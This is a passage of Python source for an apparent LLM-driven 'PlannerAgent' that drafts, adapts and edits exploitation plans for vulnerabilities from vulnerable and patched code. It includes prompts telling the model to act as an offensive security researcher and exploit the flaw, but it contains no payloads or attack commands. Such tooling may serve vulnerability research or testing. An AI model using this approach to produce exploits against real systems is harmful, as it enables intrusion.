--- VULNERABLE CODE ---
{_smart_code_for_prompt(vuln_code, max_chars=2500, label="VULNERABLE")}
--- PATCHED CODE ---
{_smart_code_for_prompt(patch_code, max_chars=1000, label="PATCHED")}

Return ONLY a JSON with sep, cep, aep, fep keys. Keep it compact."""

        try:
            raw_output = self.llm_generate(prompt, max_tokens=2048,
                                           decision="phase3.plan.infrastructure")
            json_str = _extract_json_block(raw_output)
            if not json_str:
                logger.error(f"Single-shot fallback: Could not extract JSON:\n{raw_output[:500]}")
                return None, None, None, None
            return _parse_sep_aep_json(json_str)
        except Exception as e:
            logger.error(f"Single-shot fallback error: {e}")
            return None, None, None, None

    def generate_plan_from_similar(
        self,
        vuln_code: str,
        patch_code: str,
        vuln_description: str,
        similar_sep: SEP,
        similar_aep: AEP,
        feedback: Optional[PlannerFeedback] = None,
    ) -> Tuple[Optional[SEP], Optional[CEP], Optional[AEP], Optional[FEP]]:
        """
        Generate a plan using a specific similar example (from vector search).
        This is the RAG-enhanced path for Phase B (Database Expansion).
        """
        if not self.llm_generate:
            return None, None, None, None

        # Compact similar example (no indent, truncated)
        sep_compact = json.dumps(similar_sep.__dict__, default=str)
        aep_compact = json.dumps(similar_aep.__dict__, default=str)[:500]
        similar_context = f"Similar example:\nSEP: {sep_compact}\nAEP: {aep_compact}\n"

        feedback_section = ""
        if feedback:
            feedback_section = f"PREVIOUS ATTEMPT FAILED: {feedback.suggestion}\n"

        vuln_category = classify_vuln_from_code(vuln_code)

        prompt = f"""You are an offensive security researcher. Adapt the similar example to exploit this vulnerability.
Vulnerability: {vuln_category}
{feedback_section}{similar_context}
--- VULNERABLE CODE ---
{_smart_code_for_prompt(vuln_code, max_chars=3000, label="VULNERABLE")}
--- PATCHED CODE ---
{_smart_code_for_prompt(patch_code, max_chars=1500, label="PATCHED")}

Return ONLY a JSON with sep, cep, aep, fep keys. Keep it compact."""

        try:
            raw_output = self.llm_generate(prompt, max_tokens=2048,
                                           decision="phase3.plan.infrastructure")
            json_str = _extract_json_block(raw_output)
            if not json_str:
                return None, None, None, None
            return _parse_sep_aep_json(json_str)
        except Exception as e:
            logger.error(f"PlannerAgent (RAG) error: {e}")
            return None, None, None, None

    def edit_plan(
        self,
        sep: 'SEP',
        cep: 'CEP',
        aep: 'AEP',
        fep: 'FEP',
        vuln_code: str,
        failure_reasons: list,
        suggestion: str,
        exploit_analysis: str = "",
    ) -> Tuple[Optional['SEP'], Optional['CEP'], Optional['AEP'], Optional['FEP']]:
        """
        Incremental plan edit: send only the current plan + failure info.
        Much faster than regenerating from scratch because the prompt is ~5x smaller
        (no few-shot examples, no full system prompt, no code analysis hints).

        Returns updated (SEP, CEP, AEP, FEP) or None on failure.
        """
        if not self.llm_generate:
            return None, None, None, None

        # Build compact plan representation — truncate large payloads
        def _compact_dict(obj):
            d = obj.__dict__ if hasattr(obj, '__dict__') else (obj if isinstance(obj, dict) else {})
            return {k: v for k, v in d.items() if v is not None and v != "" and v != []}

        sep_d = _compact_dict(sep)
        cep_d = _compact_dict(cep)
        aep_d = _compact_dict(aep)
        fep_d = _compact_dict(fep)
        # Truncate AEP inputs/generators to avoid blowup
        if "tries" in aep_d:
            compact_tries = []
            for t in aep_d["tries"][:3]:
                ct = dict(t)
                if ct.get("input") and len(str(ct["input"])) > 100:
                    ct["input"] = str(ct["input"])[:100]
                if ct.get("generator"):
                    ct["generator"] = "(script)"
                if ct.get("craft_file"):
                    ct["craft_file"] = "(file)"
                compact_tries.append(ct)
            aep_d["tries"] = compact_tries

        current_plan = json.dumps({"sep": sep_d, "cep": cep_d, "aep": aep_d, "fep": fep_d}, default=str)

        analysis_section = ""
        if exploit_analysis:
            analysis_section = f"\nExploit analysis: {exploit_analysis[:800]}\n"

        prompt = f"""You are fixing a failed vulnerability test plan. Edit ONLY the fields that need changing.

FAILURE: {', '.join(failure_reasons)}
SUGGESTION: {suggestion}
{analysis_section}
VULNERABLE CODE:
{_smart_code_for_prompt(vuln_code, max_chars=1500, label="VULNERABLE")}

CURRENT PLAN:
{current_plan}

Return the COMPLETE updated JSON (all 4 sections: sep, cep, aep, fep) with your fixes applied.
Return ONLY the JSON object, no explanation."""

        try:
            raw_output = self.llm_generate(prompt, max_tokens=2048,
                                           decision="phase3.plan.edit")
            json_str = _extract_json_block(raw_output)
            if not json_str:
                logger.warning("edit_plan: Could not extract JSON, falling back to full replan")
                return None, None, None, None
            return _parse_sep_aep_json(json_str)
        except Exception as e:
            logger.error(f"PlannerAgent edit_plan error: {e}")
            return None, None, None, None
